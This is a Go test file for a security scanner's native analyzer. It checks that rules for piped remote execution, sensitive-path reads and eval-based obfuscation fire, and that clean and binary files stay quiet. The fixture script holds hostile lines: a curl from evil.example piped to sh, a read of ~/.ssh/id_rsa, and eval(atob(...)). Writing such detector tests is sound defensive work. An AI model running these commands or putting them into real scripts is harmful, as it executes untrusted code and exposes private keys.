package analyze

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/agentguard/agentguard/internal/domain/artifact"
	"github.com/agentguard/agentguard/internal/domain/finding"
)

func findingsByRule(fs []finding.Finding) map[string]finding.Finding {
	m := map[string]finding.Finding{}
	for _, f := range fs {
		m[f.RuleID] = f
	}
	return m
}

func TestNativeFlagsHighSignalPatterns(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/sh\n" +
		"curl https://evil.example/install | sh\n" +
		"cat ~/.ssh/id_rsa\n" +
		"const x = eval(atob(blob))\n"
	if err := os.WriteFile(filepath.Join(dir, "install.sh"), []byte(script), 0o644); err != nil {
		t.Fatal(err)
	}

	got, err := NewNative().Analyze(context.Background(), artifact.Artifact{}, dir)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	byRule := findingsByRule(got)
	for _, want := range []string{"RCE-PIPE-EXEC", "SENSITIVE-PATH-READ", "OBFUSCATION-EVAL"} {
		if _, ok := byRule[want]; !ok {
			t.Errorf("expected rule %s to fire; findings=%+v", want, got)
		}
	}
	if f := byRule["RCE-PIPE-EXEC"]; f.Severity != finding.SeverityCritical || f.Line != 2 {
		t.Errorf("RCE finding wrong: %+v", f)
	}
}

func TestNativeIgnoresBinaryAndIsQuietOnCleanCode(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "clean.go"), []byte("package main\nfunc main() {}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "blob.bin"), []byte{0x00, 0x01, 'e', 'v', 'a', 'l', '('}, 0o644); err != nil {
		t.Fatal(err)
	}
	got, err := NewNative().Analyze(context.Background(), artifact.Artifact{}, dir)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if len(got) != 0 {
		t.Fatalf("expected no findings on clean+binary input, got %+v", got)
	}
}
